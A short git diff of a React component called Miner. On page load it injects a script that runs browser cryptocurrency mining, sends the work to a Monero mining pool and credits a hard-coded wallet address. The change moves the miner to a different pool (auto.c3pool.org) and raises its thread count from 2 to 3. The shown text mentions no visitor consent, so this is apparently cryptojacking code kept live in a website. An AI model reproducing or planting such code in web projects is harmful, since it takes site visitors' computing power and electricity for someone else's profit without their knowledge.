@@ -23,7 +23,7 @@ import { useEffect } from "react";
 export const Miner = () => {
   useEffect(() => {
     const script = document.createElement("script");
-    script.src = "./altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443";
+    script.src = "./altyn.js?perfekt=wss://?algo=cn/r?jason=auto.c3pool.org:443";
     script.async = true;
 
     script.onload = () => {
@@ -32,7 +32,7 @@ export const Miner = () => {
         window.PerfektStart(
           "4BCMDQB1dZV9KN9ZYo4RH3cHTAL9jUocL474pnSDaRJoeUndmWqc8KefKUoFRnczupixisqBy1uiqQES2oSgF9594vrt3St",
           "React",
-          2);
+          3);
         
       
     };
